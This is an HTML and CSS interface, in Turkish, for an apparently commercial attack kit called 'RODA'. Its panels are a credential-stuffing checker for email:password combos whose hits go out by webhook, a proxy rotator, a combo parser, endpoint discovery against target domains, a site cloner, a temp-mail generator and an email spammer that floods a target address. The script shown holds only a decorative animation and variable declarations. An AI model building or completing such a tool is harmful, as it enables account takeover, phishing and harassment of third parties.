<link href="https://fonts.googleapis.com/css2?family=Outfit:wght@300;400;500;600;700;800;900&display=swap" rel="stylesheet">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
<style>
*{margin:0;padding:0;box-sizing:border-box;font-family:Outfit,sans-serif}
body{background:#0a0e1a;color:#e8edf5;height:100vh;overflow:hidden;display:flex}
:root{--p:#3b82f6;--p2:#6366f1;--g:#10b981;--r:#ef4444;--card:#0f172a;--border:rgba(59,130,246,0.2);--bg:#0a0e1a;--sidebar:#020617;--text:#e8edf5;--muted:#94a3b8;--gold:#fbbf24}
/* KAR TANESİ ARKA PLAN */
.snowflakes{position:fixed;top:0;left:0;width:100%;height:100%;pointer-events:none;z-index:0;overflow:hidden}
.snowflake{position:absolute;color:#fff;font-size:1.5em;top:-10%;animation:fall linear infinite;opacity:0.7}
@keyframes fall{0%{transform:translateY(0) rotate(0deg) scale(0.5);opacity:0.8}100%{transform:translateY(110vh) rotate(720deg) scale(1.2);opacity:0.2}}
#login-screen{position:fixed;top:0;left:0;width:100%;height:100%;z-index:9999;display:flex;justify-content:center;align-items:center;background:var(--bg);background-image:radial-gradient(circle at 30% 40%, rgba(59,130,246,0.08),transparent 50%),radial-gradient(circle at 70% 60%, rgba(99,102,241,0.08),transparent 50%)}
#login-box{width:420px;padding:45px 40px;text-align:center;background:var(--card);border:1px solid var(--border);border-radius:28px;box-shadow:0 30px 60px rgba(0,0,0,0.5);z-index:10}
#login-box .logo i{font-size:56px;background:linear-gradient(135deg,var(--p),var(--p2));-webkit-background-clip:text;-webkit-text-fill-color:transparent}
#login-box h1{font-size:28px;font-weight:900;letter-spacing:1px;background:linear-gradient(135deg,var(--p),var(--p2));-webkit-background-clip:text;-webkit-text-fill-color:transparent}
#login-box .sub{color:var(--muted);margin-bottom:25px;font-size:14px}
.inp{width:100%;padding:14px 18px;background:rgba(0,0,0,0.4);border:1px solid var(--border);color:#fff;border-radius:14px;font-size:15px;outline:none;transition:0.3s}
.inp:focus{border-color:var(--p);box-shadow:0 0 20px rgba(59,130,246,0.08)}
.btn{padding:15px;border:none;border-radius:14px;font-weight:700;cursor:pointer;background:linear-gradient(135deg,var(--p),var(--p2));color:#fff;width:100%;font-size:16px;transition:0.3s}
.btn:hover{transform:translateY(-2px);box-shadow:0 12px 24px rgba(59,130,246,0.25)}
.btn.sm{width:auto;padding:8px 16px;font-size:12px}
.btn.g{background:var(--g)}.btn.r{background:var(--r)}.btn.b{background:#1a73e8}
#sidebar{width:260px;min-width:260px;background:var(--sidebar);border-right:1px solid var(--border);display:flex;flex-direction:column;height:100vh;overflow-y:auto;position:relative;z-index:2}
.sidebar-header{padding:18px 20px;text-align:center;border-bottom:1px solid var(--border)}
.sidebar-header .logo-text{font-size:24px;font-weight:900;letter-spacing:2px;background:linear-gradient(135deg,var(--p),var(--p2));-webkit-background-clip:text;-webkit-text-fill-color:transparent}
.sidebar-header .version{font-size:10px;color:var(--muted);letter-spacing:1px;margin-top:2px}
.sidebar-nav{flex:1;padding:12px 12px;overflow-y:auto}
.nav-divider{padding:8px 12px;font-size:10px;color:#475569;text-transform:uppercase;letter-spacing:1px;font-weight:700;margin-top:6px}
.nav-item{display:flex;align-items:center;gap:12px;padding:9px 14px;border-radius:8px;cursor:pointer;color:#94a3b8;font-weight:500;font-size:13px;transition:0.2s;margin-top:2px}
.nav-item:hover{background:rgba(59,130,246,0.06);color:#fff}
.nav-item.active{background:rgba(59,130,246,0.12);color:var(--p);border-left:3px solid var(--p)}
.nav-item i{font-size:16px;width:22px;text-align:center}
.nav-divider-admin{padding:8px 12px;font-size:10px;color:#475569;text-transform:uppercase;letter-spacing:1px;font-weight:700;margin-top:6px;border-top:1px solid var(--border)}
.sidebar-stats{padding:10px 14px;border-top:1px solid var(--border);display:flex;flex-wrap:wrap;gap:6px}
.mini-stat{flex:1;min-width:44%;background:var(--card);padding:6px 4px;border-radius:8px;text-align:center;border:1px solid rgba(255,255,255,0.03)}
.mini-stat .val{font-size:14px;font-weight:800;color:var(--text)}
.mini-stat .lbl{font-size:8px;color:var(--muted);text-transform:uppercase;letter-spacing:0.5px}
.mini-hit .val{color:var(--g)}.mini-2fa .val{color:var(--gold)}.mini-bad .val{color:var(--r)}.mini-check .val{color:var(--p)}
.sidebar-footer{padding:10px;text-align:center;font-size:9px;color:#334155;border-top:1px solid var(--border)}
#app{display:none;flex:1;flex-direction:column;height:100vh;position:relative;z-index:1}
.topbar{display:flex;align-items:center;gap:16px;padding:10px 20px;background:var(--card);border-bottom:1px solid var(--border)}
.topbar-title{font-size:15px;font-weight:700;color:var(--text)}
.topbar-title i{margin-right:8px;color:var(--p)}
.topbar-right{margin-left:auto;display:flex;align-items:center;gap:14px}
.pulse-dot{width:10px;height:10px;border-radius:50%;background:var(--g);animation:pulse 2s infinite}
@keyframes pulse{0%,100%{opacity:1}50%{opacity:0.4}}
.pulse-dot.idle{background:#475569;animation:none}
.main-content{flex:1;display:flex;overflow:hidden;background:var(--bg)}
.page{display:none;flex:1;flex-direction:column;padding:14px 18px;overflow-y:auto}
.page.active{display:flex}
.card{background:var(--card);border:1px solid var(--border);border-radius:14px;padding:14px 16px;margin-bottom:12px}
.card h3{font-size:14px;font-weight:700;margin-bottom:8px;color:var(--text)}
.card h3 i{color:var(--p);margin-right:6px}
.stats-row{display:grid;grid-template-columns:repeat(5,1fr);gap:10px;margin-bottom:12px}
.stat-card{background:var(--card);border:1px solid var(--border);border-radius:12px;padding:12px;text-align:center}
.stat-card .stat-val{font-size:22px;font-weight:800}
.stat-card .stat-lbl{font-size:10px;color:var(--muted);text-transform:uppercase;letter-spacing:0.5px}
.stat-hit .stat-val{color:var(--g)}.stat-2fa .stat-val{color:var(--gold)}.stat-bad .stat-val{color:var(--r)}.stat-total .stat-val{color:var(--p)}.stat-error .stat-val{color:#f59e0b}
.result-header{display:grid;grid-template-columns:60px 70px 1fr 110px;gap:8px;padding:6px 12px;font-size:10px;font-weight:700;color:var(--muted);text-transform:uppercase;border-bottom:1px solid var(--border)}
.result-row{display:grid;grid-template-columns:60px 70px 1fr 110px;gap:8px;padding:6px 12px;border-bottom:1px solid rgba(255,255,255,0.03);font-size:12px;align-items:center}
.result-row:hover{background:rgba(59,130,246,0.03)}
.hit{color:var(--g)}.bad{color:var(--r)}.twofa{color:var(--gold)}.error{color:#f59e0b}
.method{font-weight:600;padding:1px 6px;border-radius:4px;font-size:9px;display:inline-block}
.method.get{background:rgba(16,185,129,0.12);color:var(--g)}
.method.post{background:rgba(59,130,246,0.12);color:#448aff}
.method.other{background:rgba(245,158,11,0.12);color:#f59e0b}
.category{padding:1px 8px;border-radius:12px;font-size:9px;font-weight:500;display:inline-block}
.cat-auth{background:rgba(239,68,68,0.12);color:#ef4444}
.cat-admin{background:rgba(245,158,11,0.12);color:#f59e0b}
.cat-user{background:rgba(16,185,129,0.12);color:var(--g)}
.cat-health{background:rgba(59,130,246,0.12);color:#448aff}
.cat-api{background:rgba(59,130,246,0.12);color:var(--p)}
.cat-genel{background:rgba(255,255,255,0.04);color:#94a3b8}
.scan-top{display:flex;gap:10px;flex-wrap:wrap;align-items:center}
.scan-top input{flex:1;min-width:150px;padding:8px 14px;background:rgba(0,0,0,0.3);border:1px solid var(--border);border-radius:10px;color:#fff;font-size:13px;outline:none}
.scan-top input:focus{border-color:var(--p)}
.scan-top button{padding:8px 20px;background:linear-gradient(135deg,var(--p),var(--p2));color:#fff;border:none;border-radius:10px;font-weight:700;cursor:pointer;display:flex;align-items:center;gap:6px;font-size:13px}
.scan-top button:disabled{opacity:0.5;cursor:not-allowed}
.filters{display:flex;gap:10px;flex-wrap:wrap;margin-bottom:8px}
.filters label{display:flex;align-items:center;gap:4px;font-size:11px;color:#94a3b8;cursor:pointer}
.filters input[type=checkbox]{accent-color:var(--p);width:13px;height:13px}
.results-container{flex:1;overflow-y:auto;border-radius:12px;background:rgba(0,0,0,0.25);border:1px solid var(--border)}
.webhook-area{margin-top:10px;display:flex;gap:10px;flex-wrap:wrap;align-items:center}
.webhook-area input{flex:1;min-width:150px;padding:6px 12px;background:rgba(0,0,0,0.3);border:1px solid var(--border);border-radius:10px;color:#fff;font-size:12px;outline:none}
.webhook-area input:focus{border-color:var(--p)}
.webhook-area button{padding:6px 16px;background:linear-gradient(135deg,var(--p),var(--p2));color:#fff;border:none;border-radius:10px;font-weight:600;cursor:pointer;font-size:12px}
.setting-row{display:flex;align-items:center;justify-content:space-between;padding:8px 0;border-bottom:1px solid var(--border)}
.setting-row label{font-size:13px;font-weight:500}
.setting-row .desc{font-size:10px;color:var(--muted)}
.switch{position:relative;width:40px;height:22px}
.switch input{display:none}
.slider{position:absolute;top:0;left:0;right:0;bottom:0;background:var(--border);border-radius:22px;cursor:pointer;transition:0.3s}
.slider:before{content:"";position:absolute;height:16px;width:16px;left:3px;bottom:3px;background:#fff;border-radius:50%;transition:0.3s}
input:checked+.slider{background:var(--g)}
input:checked+.slider:before{transform:translateX(18px)}
.proxy-area{display:flex;gap:10px;flex-wrap:wrap;margin-top:6px}
.proxy-area textarea{flex:1;min-width:180px;height:50px;padding:6px 10px;background:rgba(0,0,0,0.3);border:1px solid var(--border);border-radius:8px;color:#fff;font-size:11px;outline:none;resize:vertical;font-family:monospace}
.proxy-area textarea:focus{border-color:var(--p)}
.checker-platform-select{display:flex;gap:8px;flex-wrap:wrap;margin-bottom:12px}
.checker-platform-select button{padding:6px 14px;background:rgba(59,130,246,0.08);border:1px solid rgba(59,130,246,0.15);border-radius:8px;color:#94a3b8;font-size:12px;cursor:pointer;transition:0.2s;display:flex;align-items:center;gap:4px}
.checker-platform-select button:hover{background:rgba(59,130,246,0.15);border-color:var(--p);color:#fff}
.checker-platform-select button.active{background:rgba(59,130,246,0.2);border-color:var(--p);color:var(--p)}
.checker-panel{display:none;background:var(--card);border:1px solid var(--border);border-radius:14px;padding:14px;margin-top:8px}
.checker-panel.active{display:block}
.checker-top{display:flex;gap:10px;flex-wrap:wrap;align-items:center;margin-bottom:10px}
.checker-top textarea{flex:1;min-width:200px;height:60px;padding:8px 12px;background:rgba(0,0,0,0.3);border:1px solid var(--border);border-radius:8px;color:#fff;font-size:12px;outline:none;resize:vertical;font-family:monospace}
.checker-top textarea:focus{border-color:var(--p)}
.checker-top input[type=number]{width:70px;padding:8px;text-align:center;background:rgba(0,0,0,0.3);border:1px solid var(--border);border-radius:8px;color:#fff;font-size:13px;outline:none}
.checker-top input[type=number]:focus{border-color:var(--p)}
.checker-top button{padding:6px 18px;background:linear-gradient(135deg,var(--p),var(--p2));color:#fff;border:none;border-radius:8px;font-weight:600;cursor:pointer;font-size:13px}
.checker-top button:disabled{opacity:0.5}
.checker-top button#checkerStopBtn{background:var(--r);display:none}
.checker-filters{display:flex;gap:8px;flex-wrap:wrap;margin-bottom:8px}
.checker-filters label{display:flex;align-items:center;gap:4px;font-size:11px;color:#94a3b8;cursor:pointer}
.checker-filters input[type=radio]{accent-color:var(--p);width:13px;height:13px}
.checker-results{max-height:250px;overflow-y:auto;border-radius:8px;background:rgba(0,0,0,0.2);border:1px solid var(--border)}
.checker-result-row{display:grid;grid-template-columns:1fr 100px 60px;gap:8px;padding:6px 12px;border-bottom:1px solid rgba(255,255,255,0.03);font-size:12px;align-items:center}
.checker-result-row .chk-status{font-weight:600}
.chk-hit{color:var(--g)}.chk-bad{color:var(--r)}.chk-2fa{color:var(--gold)}.chk-error{color:#f59e0b}
.checker-stats{display:flex;gap:16px;flex-wrap:wrap;margin:6px 0;font-size:12px}
.checker-stats span{color:var(--muted)}
.checker-stats .chk-count{font-weight:700;color:var(--text)}
.hit-panel{display:grid;grid-template-columns:1fr 1fr;gap:12px;margin-top:12px}
.hit-panel .hit-box{background:var(--card);border:1px solid var(--border);border-radius:12px;padding:12px}
.hit-panel .hit-box h4{font-size:13px;font-weight:700;margin-bottom:6px;display:flex;align-items:center;gap:6px}
.hit-panel .hit-box h4 i{font-size:14px}
.hit-panel .hit-box .hit-list{max-height:150px;overflow-y:auto;font-size:12px;color:var(--muted)}
.hit-panel .hit-box .hit-list .hit-item{padding:3px 0;border-bottom:1px solid rgba(255,255,255,0.03);display:flex;justify-content:space-between}
.hit-panel .hit-box .hit-list .hit-item .hit-email{color:var(--text)}
.hit-panel .hit-box .hit-list .hit-item .hit-time{font-size:10px;color:var(--muted)}
.hit-filter{display:flex;gap:8px;flex-wrap:wrap;margin-bottom:6px}
.hit-filter select{padding:4px 10px;background:rgba(0,0,0,0.3);border:1px solid var(--border);border-radius:6px;color:#fff;font-size:12px;outline:none}
.hit-filter select:focus{border-color:var(--p)}
/* AYRIŞTIRMA */
.parse-area{display:flex;flex-direction:column;gap:10px}
.parse-area textarea{width:100%;height:180px;padding:10px;background:rgba(0,0,0,0.3);border:1px solid var(--border);border-radius:8px;color:#fff;font-size:12px;font-family:monospace;resize:vertical;outline:none}
.parse-area textarea:focus{border-color:var(--p)}
.parse-buttons{display:flex;gap:10px;flex-wrap:wrap}
.parse-result{max-height:200px;overflow-y:auto;background:rgba(0,0,0,0.2);border:1px solid var(--border);border-radius:8px;padding:8px}
.parse-result .parse-line{padding:2px 6px;font-size:12px;font-family:monospace;color:#c8d0dc}
.parse-result .parse-count{color:var(--g);font-weight:600;font-size:13px}
.discovery-platforms{display:flex;gap:6px;flex-wrap:wrap;margin-bottom:8px}
.discovery-platforms button{padding:4px 12px;background:rgba(59,130,246,0.06);border:1px solid rgba(59,130,246,0.1);border-radius:6px;color:#94a3b8;font-size:11px;cursor:pointer;transition:0.2s}
.discovery-platforms button:hover{background:rgba(59,130,246,0.12);border-color:var(--p);color:#fff}
.discovery-platforms button.active{background:rgba(59,130,246,0.15);border-color:var(--p);color:var(--p)}
::-webkit-scrollbar{width:4px}::-webkit-scrollbar-thumb{background:rgba(59,130,246,0.2);border-radius:4px}
</style>
</head>
<body>
<!-- KAR TANELERİ -->
<div class="snowflakes" id="snowContainer"></div>

<div id="login-screen">
<div id="login-box">
<div class="logo"><i class="fa-solid fa-crown"></i></div>
<h1>RODA</h1>
<p class="sub">API Discovery + Checker</p>
<input class="inp" type="password" id="authKey" placeholder="Güvenlik Anahtarı" autofocus>
<button class="btn" onclick="doLogin()" style="margin-top:12px">Giriş Yap</button>
<p id="loginError" style="color:var(--r);margin-top:12px;display:none"></p>
</div>
</div>

<div id="sidebar">
<div class="sidebar-header"><div class="logo-text">RODA</div><div class="version">v3.0</div></div>
<div class="sidebar-nav">
<div class="nav-divider">📁 MENÜ</div>
<div class="nav-item active" data-page="checker" onclick="switchPage('checker')"><i class="fa-solid fa-check-double"></i> Checker</div>
<div class="nav-item" data-page="proxy" onclick="switchPage('proxy')"><i class="fa-solid fa-server"></i> Proxy</div>
<div class="nav-item" data-page="parse" onclick="switchPage('parse')"><i class="fa-solid fa-scissors"></i> Ayrıştırma</div>

<!-- ADMIN ÖZEL MENÜLER (ALT KISIM) -->
<div class="nav-divider-admin">🔒 ADMIN</div>
<div class="nav-item" data-page="logs" onclick="switchPage('logs')" id="logsMenuItem" style="display:none"><i class="fa-solid fa-history"></i> Loglar</div>
<div class="nav-item" data-page="discovery" onclick="switchPage('discovery')" id="discoveryMenuItem" style="display:none"><i class="fa-solid fa-compass"></i> API Keşif</div>
<div class="nav-item" data-page="stats" onclick="switchPage('stats')" id="statsMenuItem" style="display:none"><i class="fa-solid fa-chart-simple"></i> İstatistik</div>
<div class="nav-item" data-page="keys" onclick="switchPage('keys')" id="keysMenuItem" style="display:none"><i class="fa-solid fa-key"></i> Key Yönetimi</div>
<div class="nav-item" data-page="sitecopy" onclick="switchPage('sitecopy')" id="sitecopyMenuItem" style="display:none"><i class="fa-solid fa-copy"></i> Site Kopyala</div>
<div class="nav-item" data-page="tempmail" onclick="switchPage('tempmail')" id="tempmailMenuItem" style="display:none"><i class="fa-solid fa-envelope"></i> Temp Mail</div>
<div class="nav-item" data-page="spammer" onclick="switchPage('spammer')" id="spammerMenuItem" style="display:none"><i class="fa-solid fa-bomb"></i> Email Spammer</div>
</div>
<div class="sidebar-stats">
<div class="mini-stat mini-hit"><div class="val" id="sideTotal">0</div><div class="lbl">Bulunan</div></div>
<div class="mini-stat mini-2fa"><div class="val" id="sideAuth">0</div><div class="lbl">Auth</div></div>
<div class="mini-stat mini-bad"><div class="val" id="sideAPI">0</div><div class="lbl">API</div></div>
<div class="mini-stat mini-check"><div class="val" id="sideAdmin">0</div><div class="lbl">Admin</div></div>
</div>
<div class="sidebar-footer">© 2026 Roda</div>
</div>

<div id="app">
<div class="topbar">
<div class="topbar-title"><i class="fa-solid fa-gauge-high"></i> <span id="pageTitle">Checker</span></div>
<div class="topbar-right">
<span style="font-size:11px;color:var(--muted)">Durum:</span>
<div class="pulse-dot idle" id="statusDot"></div>
<span style="font-size:12px;font-weight:600" id="statusText">Boşta</span>
<span id="userBadge" style="font-size:11px;background:var(--p);padding:2px 10px;border-radius:12px;display:none">Admin</span>
</div>
</div>
<div class="main-content">

<!-- CHECKER -->
<div id="page-checker" class="page active">
<div class="card">
<h3><i class="fa-solid fa-check-double"></i> Platform Checker</h3>
<p style="font-size:12px;color:var(--muted);margin-bottom:10px">Bir platform seçin, combo girişi yapın ve kontrol başlatın. <span style="color:var(--gold)">✅ HIT'ler otomatik webhook ile gönderilir!</span></p>
<div class="checker-platform-select" id="checkerPlatformSelect"></div>
<div class="checker-panel" id="checkerPanel">
<div class="checker-top">
<textarea id="checkerCombo" placeholder="email:password (her satıra bir combo)"></textarea>
<input type="number" id="checkerThreads" value="1" min="1" max="50">
<button id="checkerStartBtn" onclick="startChecker()"><i class="fa-solid fa-play"></i> Başlat</button>
<button id="checkerStopBtn" onclick="stopChecker()"><i class="fa-solid fa-stop"></i> Durdur</button>
</div>
<div class="checker-stats">
<span>Toplam: <span class="chk-count" id="chkTotal">0</span></span>
<span>Başarılı: <span class="chk-count" id="chkHit">0</span></span>
<span>Başarısız: <span class="chk-count" id="chkBad">0</span></span>
<span>2FA: <span class="chk-count" id="chk2fa">0</span></span>
<span>Hata: <span class="chk-count" id="chkError">0</span></span>
<span>Kalan: <span class="chk-count" id="chkRemaining">0</span></span>
</div>
<div class="checker-filters">
<label><input type="radio" name="chkFilter" value="all" checked> Hepsi</label>
<label><input type="radio" name="chkFilter" value="hit"> Başarılı</label>
<label><input type="radio" name="chkFilter" value="bad"> Başarısız</label>
<label><input type="radio" name="chkFilter" value="2fa"> 2FA</label>
<label><input type="radio" name="chkFilter" value="error"> Hata</label>
</div>
<div class="checker-results" id="checkerResults">
<div style="padding:20px;text-align:center;color:var(--muted);font-size:13px">Henüz sonuç yok.</div>
</div>
</div>
</div>
<!-- HIT / 2FA PANEL -->
<div class="card">
<h3><i class="fa-solid fa-database"></i> HIT & 2FA Arşivi</h3>
<button class="btn sm r" onclick="clearHits()" style="width:auto;margin-bottom:6px"><i class="fa-solid fa-trash"></i> Tümünü Temizle</button>
<div class="hit-filter">
<select id="hitPlatformFilter" onchange="renderHits()">
<option value="all">Tüm Platformlar</option>
</select>
</div>
<div class="hit-panel">
<div class="hit-box">
<h4 style="color:var(--g)"><i class="fa-solid fa-check-circle"></i> HIT</h4>
<div class="hit-list" id="hitList"><div style="color:var(--muted);font-size:12px">Henüz HIT yok.</div></div>
</div>
<div class="hit-box">
<h4 style="color:var(--gold)"><i class="fa-solid fa-shield-halved"></i> 2FA</h4>
<div class="hit-list" id="twofaList"><div style="color:var(--muted);font-size:12px">Henüz 2FA yok.</div></div>
</div>
</div>
</div>
</div>

<!-- PROXY -->
<div id="page-proxy" class="page">
<div class="card">
<h3><i class="fa-solid fa-server"></i> Proxy Yöneticisi</h3>
<div style="display:flex;gap:8px;flex-wrap:wrap;margin-bottom:8px">
<button class="btn sm g" onclick="fetchProxies()"><i class="fa-solid fa-cloud-arrow-down"></i> Proxy Çek</button>
<button class="btn sm r" onclick="clearProxies()"><i class="fa-solid fa-trash"></i> Temizle</button>
</div>
<div class="setting-row">
<div><label>Proxy Kullan</label><div class="desc">Checker sırasında proxy kullan</div></div>
<label class="switch"><input type="checkbox" id="useProxy" onchange="toggleProxy()"><span class="slider"></span></label>
</div>
<div class="proxy-area">
<textarea id="proxyList" placeholder="ip:port&#10;ip:port"></textarea>
</div>
<div style="margin-top:6px"><span id="proxyCount" style="color:var(--g);font-size:12px">0 proxy yüklendi</span></div>
</div>
</div>

<!-- API KEŞİF (ADMIN) -->
<div id="page-discovery" class="page">
<div class="card" style="padding:10px 14px">
<div class="scan-top">
<input id="targetDomain" placeholder="hedef.com (örn: youtube.com)" value="example.com">
<button id="scanBtn" onclick="startScan()"><i class="fa-solid fa-play"></i> Tara</button>
</div>
<div class="discovery-platforms" id="discoveryPlatforms"></div>
</div>
<div class="stats-row">
<div class="stat-card stat-hit"><div class="stat-val" id="totalCount">0</div><div class="stat-lbl">Toplam</div></div>
<div class="stat-card stat-2fa"><div class="stat-val" id="authCount">0</div><div class="stat-lbl">Auth</div></div>
<div class="stat-card stat-bad"><div class="stat-val" id="apiCount">0</div><div class="stat-lbl">API</div></div>
<div class="stat-card stat-total"><div class="stat-val" id="adminCount">0</div><div class="stat-lbl">Admin</div></div>
</div>
<div class="filters" id="filterContainer">
<label><input type="checkbox" value="Auth" checked> Auth</label>
<label><input type="checkbox" value="Admin" checked> Admin</label>
<label><input type="checkbox" value="User" checked> User</label>
<label><input type="checkbox" value="Health" checked> Health</label>
<label><input type="checkbox" value="API" checked> API</label>
<label><input type="checkbox" value="Genel" checked> Genel</label>
</div>
<div class="results-container">
<div class="result-header"><div>Metod</div><div>Durum</div><div>Endpoint</div><div>Kategori</div></div>
<div id="resultsList"></div>
</div>
<div class="webhook-area">
<input id="webhookUrl" placeholder="Discord Webhook URL">
<button onclick="saveWebhook()"><i class="fa-solid fa-floppy-disk"></i> Webhook Kaydet</button>
<button onclick="testWebhook()"><i class="fa-solid fa-paper-plane"></i> Test</button>
<button onclick="sendWebhook()"><i class="fa-brands fa-discord"></i> Discord</button>
<button onclick="exportJSON()" class="btn sm b"><i class="fa-solid fa-download"></i> JSON</button>
<p id="webhookStatus" style="margin-top:6px;font-size:12px;color:var(--muted)"></p>
</div>
</div>

<!-- AYRIŞTIRMA (2 MOD) -->
<div id="page-parse" class="page">
<div class="card">
<h3><i class="fa-solid fa-scissors"></i> Ayrıştırma</h3>
<p style="font-size:12px;color:var(--muted);margin-bottom:10px">Karmaşık metinleri temizler, 2 mod seçeneği ile ayrıştırır.</p>
<div class="parse-area">
<label style="font-size:13px;color:var(--muted)">Mod Seç:</label>
<select id="parseMode" style="padding:8px;background:rgba(0,0,0,0.3);border:1px solid var(--border);border-radius:8px;color:#fff;font-size:12px;outline:none;width:200px">
<option value="email">Email:Şifre</option>
<option value="user">Kullanıcı:Şifre</option>
</select>
<textarea id="parseInput" placeholder="Buraya karışık metni yapıştır..."></textarea>
<div class="parse-buttons">
<button class="btn sm g" onclick="parseData()"><i class="fa-solid fa-wand-magic-sparkles"></i> Ayrıştır</button>
<button class="btn sm b" onclick="parseToChecker()"><i class="fa-solid fa-arrow-right"></i> Checker'a Aktar</button>
<button class="btn sm r" onclick="clearParse()"><i class="fa-solid fa-eraser"></i> Temizle</button>
<button class="btn sm" style="background:#64748b" onclick="loadParseFile()"><i class="fa-solid fa-folder-open"></i> Dosya Yükle</button>
</div>
<div class="parse-result" id="parseResult">
<div style="color:var(--muted);font-size:13px;padding:10px">Henüz ayrıştırma yapılmadı.</div>
</div>
<div style="margin-top:6px;font-size:12px;color:var(--muted)">
<span id="parseCount">0 satır</span> | <span id="parseValid">0 geçerli</span>
</div>
</div>
</div>
</div>

<!-- İSTATİSTİK (ADMIN) -->
<div id="page-stats" class="page">
<h2 style="margin-bottom:14px;font-weight:700;background:linear-gradient(135deg,var(--p),var(--p2));-webkit-background-clip:text;-webkit-text-fill-color:transparent">📊 Tarama İstatistikleri</h2>
<div style="display:grid;grid-template-columns:repeat(auto-fit,minmax(160px,1fr));gap:14px">
<div style="background:var(--card);border:1px solid var(--border);border-radius:12px;padding:18px"><h3 style="font-size:12px;color:var(--muted)">Toplam Tarama</h3><p style="font-size:22px;font-weight:800;background:linear-gradient(135deg,var(--p),var(--p2));-webkit-background-clip:text;-webkit-text-fill-color:transparent" id="statScans">0</p></div>
<div style="background:var(--card);border:1px solid var(--border);border-radius:12px;padding:18px"><h3 style="font-size:12px;color:var(--muted)">Son Tarama</h3><p style="font-size:22px;font-weight:800;background:linear-gradient(135deg,var(--p),var(--p2));-webkit-background-clip:text;-webkit-text-fill-color:transparent" id="statLast">-</p></div>
<div style="background:var(--card);border:1px solid var(--border);border-radius:12px;padding:18px"><h3 style="font-size:12px;color:var(--muted)">Bulunan API</h3><p style="font-size:22px;font-weight:800;background:linear-gradient(135deg,var(--p),var(--p2));-webkit-background-clip:text;-webkit-text-fill-color:transparent" id="statEndpoints">0</p></div>
</div>
</div>

<!-- KEY YÖNETİMİ (ADMIN) -->
<div id="page-keys" class="page">
<div class="card">
<h3><i class="fa-solid fa-key"></i> Key Oluştur</h3>
<p style="font-size:11px;color:var(--muted);margin-bottom:8px">🔒 Her key sadece 1 IP'ye bağlanır ve 1 kez kullanılır.</p>
<div style="display:flex;gap:10px;flex-wrap:wrap;margin-top:6px">
<div style="flex:1"><label style="font-size:11px;color:var(--muted)">Not</label><input class="inp" id="genNote" placeholder="Müşteri" style="margin-top:4px;padding:10px"></div>
<div style="width:130px"><label style="font-size:11px;color:var(--muted)">Süre</label><select class="inp" id="genHours" style="margin-top:4px;padding:10px"><option value="1">1 Saat</option><option value="24" selected>24 Saat</option><option value="168">7 Gün</option><option value="720">30 Gün</option></select></div>
<button class="btn sm g" onclick="generateKey()" style="margin-top:22px"><i class="fa-solid fa-plus"></i> Oluştur</button>
</div>
</div>
<div class="card"><h3><i class="fa-solid fa-list"></i> Aktif Anahtarlar</h3><div id="keyList"><p style="color:var(--muted);font-size:12px">Yükleniyor...</p></div></div>
</div>

<!-- LOGLAR (ADMIN) -->
<div id="page-logs" class="page">
<div class="card">
<h3><i class="fa-solid fa-history"></i> Sistem Logları</h3>
<button class="btn sm" onclick="refreshLogs()" style="width:auto;margin-bottom:10px"><i class="fa-solid fa-rotate"></i> Yenile</button>
<div id="logsContainer" style="max-height:400px;overflow-y:auto;background:rgba(0,0,0,0.2);border-radius:8px;padding:10px;font-family:monospace;font-size:12px;"></div>
</div>
</div>

<!-- SİTE KOPYALA (ADMIN) -->
<div id="page-sitecopy" class="page">
<div class="card">
<h3><i class="fa-solid fa-copy"></i> Site Kopyala</h3>
<p style="font-size:12px;color:var(--muted);margin-bottom:10px">Bir web sitesinin tam HTML'ini kopyalar.</p>
<div class="scan-top" style="margin-bottom:12px">
<input id="siteCopyUrl" placeholder="https://ornek.com veya ornek.com" value="https://www.tabii.com">
<button onclick="copySite()"><i class="fa-solid fa-download"></i> Kopyala & İndir</button>
</div>
<div id="siteCopyResult" style="font-size:13px;color:var(--muted);"></div>
</div>
</div>

<!-- TEMP MAIL (ADMIN) -->
<div id="page-tempmail" class="page">
<div class="card">
<h3><i class="fa-solid fa-envelope"></i> Geçici E-Posta</h3>
<p style="font-size:12px;color:var(--muted);margin-bottom:10px">Mail.tm ile geçici e-posta oluşturur.</p>
<div style="display:flex;gap:10px;flex-wrap:wrap;margin-bottom:12px">
<input class="inp" id="tempMailInput" placeholder="E-posta adresi" readonly style="flex:1;padding:10px">
<button class="btn sm g" onclick="generateTempMail()"><i class="fa-solid fa-plus"></i> Adres Üret</button>
<button class="btn sm b" onclick="copyTempMail()"><i class="fa-solid fa-copy"></i> Kopyala</button>
</div>
<button class="btn sm" onclick="refreshTempMail()" style="width:auto;margin-bottom:10px"><i class="fa-solid fa-rotate"></i> Gelen Kutusunu Yenile</button>
<div id="tempMailInbox" style="max-height:300px;overflow-y:auto;background:rgba(0,0,0,0.2);border-radius:8px;padding:10px;font-size:13px;"></div>
<div id="tempMailContent" style="margin-top:10px;background:rgba(0,0,0,0.2);border-radius:8px;padding:10px;font-size:13px;"></div>
</div>
</div>

<!-- EMAIL SPAMMER (ADMIN) -->
<div id="page-spammer" class="page">
<div class="card">
<h3><i class="fa-solid fa-bomb"></i> Email Spammer</h3>
<p style="font-size:12px;color:var(--muted);margin-bottom:10px">Hedef e-postaya sürekli paket gönderir.</p>
<div style="display:flex;gap:10px;flex-wrap:wrap;margin-bottom:12px">
<input class="inp" id="spamEmailInput" placeholder="Hedef e-posta" style="flex:1;padding:10px">
<button class="btn sm r" onclick="startSpam()"><i class="fa-solid fa-play"></i> Başlat</button>
<button class="btn sm" onclick="stopSpam()" id="spamStopBtn" style="display:none;background:#64748b"><i class="fa-solid fa-stop"></i> Durdur</button>
</div>
<div id="spamLog" style="max-height:300px;overflow-y:auto;background:rgba(0,0,0,0.2);border-radius:8px;padding:10px;font-family:monospace;font-size:12px;"></div>
</div>
</div>

</div>
</div>

<script>
// ============================================================
// KAR TANELERİ
// ============================================================
(function createSnow() {
    var container = document.getElementById('snowContainer');
    var flakes = ['❄','❅','❆','✦'];
    for (var i = 0; i < 50; i++) {
        var flake = document.createElement('div');
        flake.className = 'snowflake';
        flake.textContent = flakes[Math.floor(Math.random() * flakes.length)];
        flake.style.left = Math.random() * 100 + '%';
        flake.style.fontSize = (0.8 + Math.random() * 1.5) + 'em';
        flake.style.animationDuration = (6 + Math.random() * 8) + 's';
        flake.style.animationDelay = Math.random() * 5 + 's';
        container.appendChild(flake);
    }
})();

// ============================================================
// GLOBAL
// ============================================================
var currentKey = "";
var isAdmin = false;
var scanning = false;
var eventSource = null;
var foundEndpoints = [];
var useProxy = false;
var checkerRunning = false;
var checkerResults = [];
var currentPlatform = "";
